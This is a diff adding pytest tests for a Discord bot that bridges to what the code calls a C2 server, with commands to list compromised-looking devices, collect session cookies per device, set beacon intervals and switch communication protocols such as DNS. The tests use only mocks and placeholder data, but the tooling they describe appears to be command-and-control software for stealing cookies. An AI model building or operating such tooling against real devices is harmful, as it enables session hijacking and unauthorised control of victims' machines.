@@ -24,6 +24,10 @@ from bot import (  # noqa: E402
     is_admin_user,
     log_command,
     log_access_denied,
+    call_server,
+    format_server_devices,
+    format_server_cookies,
+    format_server_simple,
     beacon_interval_autocomplete,
     protocol_autocomplete,
 )
@@ -113,7 +117,115 @@ class TestLogging:
 
 
 # ---------------------------------------------------------------------------
-# Slash command tests — admin user
+# Server bridge (call_server) tests
+# ---------------------------------------------------------------------------
+
+class TestCallServer:
+    """Tests for the HTTP bridge to the C2 server."""
+
+    @pytest.mark.asyncio
+    async def test_returns_none_on_connection_error(self) -> None:
+        # call_server to a port that doesn't exist
+        import bot as b
+        original_url = b.C2_SERVER_URL
+        try:
+            # Patch at module level
+            b.C2_SERVER_URL = "http://localhost:19999"
+            # Re-import won't help, use the patched module
+            from bot import call_server as cs
+            # Actually we need to mock this differently
+            with patch("bot.C2_SERVER_URL", "http://localhost:19999"):
+                result = await call_server("/health")
+            assert result is None
+        finally:
+            b.C2_SERVER_URL = original_url
+
+    @pytest.mark.asyncio
+    async def test_returns_none_on_http_error(self) -> None:
+        mock_response = MagicMock()
+        mock_response.status_code = 500
+
+        mock_client = AsyncMock()
+        mock_client.get = AsyncMock(return_value=mock_response)
+        mock_client.__aenter__ = AsyncMock(return_value=mock_client)
+        mock_client.__aexit__ = AsyncMock(return_value=False)
+
+        with patch("bot.httpx.AsyncClient", return_value=mock_client):
+            result = await call_server("/health")
+        assert result is None
+
+
+# ---------------------------------------------------------------------------
+# Format helpers tests
+# ---------------------------------------------------------------------------
+
+class TestFormatHelpers:
+    """Tests for the server response formatting functions."""
+
+    def test_format_server_devices_with_devices(self) -> None:
+        data = {
+            "status": "success",
+            "message": "Found 2 device(s)",
+            "data": {
+                "devices": [
+                    {"name": "dev-a", "ip": "1.1.1.1", "status": "online"},
+                    {"name": "dev-b", "ip": "2.2.2.2", "status": "offline"},
+                ]
+            },
+        }
+        result = format_server_devices(data)
+        assert "dev-a" in result
+        assert "dev-b" in result
+        assert "🟢" in result
+        assert "🔴" in result
+
+    def test_format_server_devices_empty(self) -> None:
+        data = {
+            "status": "success",
+            "message": "No devices",
+            "data": {"devices": []},
+        }
+        result = format_server_devices(data)
+        assert "No devices" in result
+
+    def test_format_server_cookies(self) -> None:
+        data = {
+            "status": "success",
+            "message": "Retrieved 1 cookie(s)",
+            "data": {
+                "cookies_by_device": {
+                    "dev-a": {"session": "abc123"},
+                }
+            },
+        }
+        result = format_server_cookies(data)
+        assert "🍪" in result
+        assert "session" in result
+        assert "abc123" in result
+
+    def test_format_server_cookies_empty(self) -> None:
+        data = {
+            "status": "success",
+            "message": "No cookies",
+            "data": {"cookies_by_device": {}},
+        }
+        result = format_server_cookies(data)
+        assert "No cookies" in result
+
+    def test_format_server_simple_success(self) -> None:
+        data = {"status": "success", "message": "Interval set to 16"}
+        result = format_server_simple(data)
+        assert "✅" in result
+        assert "16" in result
+
+    def test_format_server_simple_error(self) -> None:
+        data = {"status": "error", "message": "Invalid value"}
+        result = format_server_simple(data)
+        assert "❌" in result
+
+
+# ---------------------------------------------------------------------------
+# Slash command tests — admin user (standalone fallback)
 # ---------------------------------------------------------------------------
 
 class TestShowDevicesCommand:
@@ -122,7 +234,8 @@ class TestShowDevicesCommand:
     @pytest.mark.asyncio
     async def test_admin_gets_response(self) -> None:
         interaction = _make_interaction()
-        await show_devices(interaction)
+        with patch("bot.call_server", return_value=None):
+            await show_devices(interaction)
         interaction.response.send_message.assert_called_once()
         sent_text = interaction.response.send_message.call_args[0][0]
         assert "Managed Devices" in sent_text
@@ -135,6 +248,23 @@ class TestShowDevicesCommand:
         sent_text = interaction.response.send_message.call_args[0][0]
         assert "Access denied" in sent_text
 
+    @pytest.mark.asyncio
+    async def test_uses_server_response_when_available(self) -> None:
+        interaction = _make_interaction()
+        server_data = {
+            "status": "success",
+            "message": "Found 1 device(s)",
+            "data": {
+                "devices": [
+                    {"name": "srv-dev", "ip": "10.0.0.1", "status": "online"},
+                ]
+            },
+        }
+        with patch("bot.call_server", return_value=server_data):
+            await show_devices(interaction)
+        sent_text = interaction.response.send_message.call_args[0][0]
+        assert "srv-dev" in sent_text
+
 
 class TestSetBeaconIntervalCommand:
     """Tests for the /set-beacon-interval slash command."""
@@ -142,7 +272,8 @@ class TestSetBeaconIntervalCommand:
     @pytest.mark.asyncio
     async def test_valid_interval(self) -> None:
         interaction = _make_interaction()
-        await set_beacon_interval(interaction, 16)
+        with patch("bot.call_server", return_value=None):
+            await set_beacon_interval(interaction, 16)
         sent_text = interaction.response.send_message.call_args[0][0]
         assert "✅" in sent_text
         assert "16" in sent_text
@@ -150,7 +281,8 @@ class TestSetBeaconIntervalCommand:
     @pytest.mark.asyncio
     async def test_invalid_interval(self) -> None:
         interaction = _make_interaction()
-        await set_beacon_interval(interaction, 99)
+        with patch("bot.call_server", return_value=None):
+            await set_beacon_interval(interaction, 99)
         sent_text = interaction.response.send_message.call_args[0][0]
         assert "❌" in sent_text
 
@@ -168,7 +300,8 @@ class TestRequestCookiesCommand:
     @pytest.mark.asyncio
     async def test_admin_gets_cookies(self) -> None:
         interaction = _make_interaction()
-        await request_cookies(interaction)
+        with patch("bot.call_server", return_value=None):
+            await request_cookies(interaction)
         sent_text = interaction.response.send_message.call_args[0][0]
         assert "Cookies" in sent_text
 
@@ -186,7 +319,8 @@ class TestSetCommunicationProtocolCommand:
     @pytest.mark.asyncio
     async def test_valid_protocol(self) -> None:
         interaction = _make_interaction()
-        await set_communication_protocol(interaction, "dns")
+        with patch("bot.call_server", return_value=None):
+            await set_communication_protocol(interaction, "dns")
         sent_text = interaction.response.send_message.call_args[0][0]
         assert "✅" in sent_text
         assert "dns" in sent_text
@@ -194,7 +328,8 @@ class TestSetCommunicationProtocolCommand:
     @pytest.mark.asyncio
     async def test_invalid_protocol(self) -> None:
         interaction = _make_interaction()
-        await set_communication_protocol(interaction, "ftp")
+        with patch("bot.call_server", return_value=None):
+            await set_communication_protocol(interaction, "ftp")
         sent_text = interaction.response.send_message.call_args[0][0]
         assert "❌" in sent_text
 
